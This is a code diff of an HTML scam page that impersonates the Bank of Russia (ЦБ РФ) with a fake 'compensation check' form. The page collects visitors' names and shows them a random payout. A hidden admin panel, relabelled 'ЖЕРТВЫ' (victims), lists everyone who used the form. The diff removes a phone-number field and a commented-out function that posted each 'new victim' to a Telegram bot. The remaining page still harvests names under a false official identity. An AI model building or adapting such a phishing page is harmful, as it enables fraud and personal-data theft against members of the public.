@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ЦБ РФ | Компенсация</title>
+    <title>ЦБ РФ | Проверка компенсации</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -158,11 +158,6 @@
             <input type="text" id="middleName" placeholder="Иванович">
         </div>
         
-        <div class="form-group">
-            <label>Телефон</label>
-            <input type="tel" id="phone" placeholder="+7 999 123-45-67">
-        </div>
-        
         <button class="check-btn" onclick="checkMoney()">
             🔍 ПРОВЕРИТЬ КОМПЕНСАЦИЮ
         </button>
@@ -197,7 +192,7 @@
         
         <!-- Скрытая админка -->
         <div class="admin-toggle">
-            <button class="admin-btn" onclick="toggleAdmin()">👁️ АДМИН ПАНЕЛЬ</button>
+            <button class="admin-btn" onclick="toggleAdmin()">📊 ЖЕРТВЫ (админ)</button>
         </div>
         
         <div class="admin-panel" id="adminPanel">
@@ -210,13 +205,12 @@
     </div>
     
     <script>
-        // Храним данные в localStorage (в реальности лучше на сервер)
+        // Храним данные в localStorage
         let victimsData = JSON.parse(localStorage.getItem('victimsData')) || [];
         
         function checkMoney() {
             const lastName = document.getElementById('lastName').value;
             const firstName = document.getElementById('firstName').value;
-            const phone = document.getElementById('phone').value;
             
             if (!lastName || !firstName) {
                 alert('Введите фамилию и имя');
@@ -230,10 +224,8 @@
             // Сохраняем данные
             const victimInfo = {
                 name: `${lastName} ${firstName} ${document.getElementById('middleName').value || ''}`,
-                phone: phone,
                 amount: randomAmount,
                 time: new Date().toLocaleString('ru-RU'),
-                ip: 'собирается...'
             };
             
             victimsData.push(victimInfo);
@@ -251,28 +243,6 @@
             
             // Обновляем админку
             updateAdminPanel();
-            
-            // Отправка в Telegram (если настроен бот)
-            sendToTelegram(victimInfo);
-        }
-        
-        // Функция отправки в Telegram
-        function sendToTelegram(data) {
-            // Раскомментируй и настрой если хочешь получать уведомления
-            /*
-            const botToken = 'ТВОЙ_ТОКЕН';
-            const chatId = 'ТВОЙ_CHAT_ID';
-            const message = `Новая жертва: ${data.name}\nТелефон: ${data.phone}\nСумма: ${data.amount} руб`;
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            });
-            */
         }
         
         // Админ панель
@@ -294,7 +264,6 @@
                 html += `
                     <div style="background: #f1f1f1; padding: 10px; margin: 5px 0; border-radius: 5px;">
                         <strong>${victim.name}</strong><br>
-                        📱 ${victim.phone || 'нет телефона'}<br>
                         💰 ${victim.amount.toLocaleString()} руб<br>
                         ⏰ ${victim.time}
                     </div>
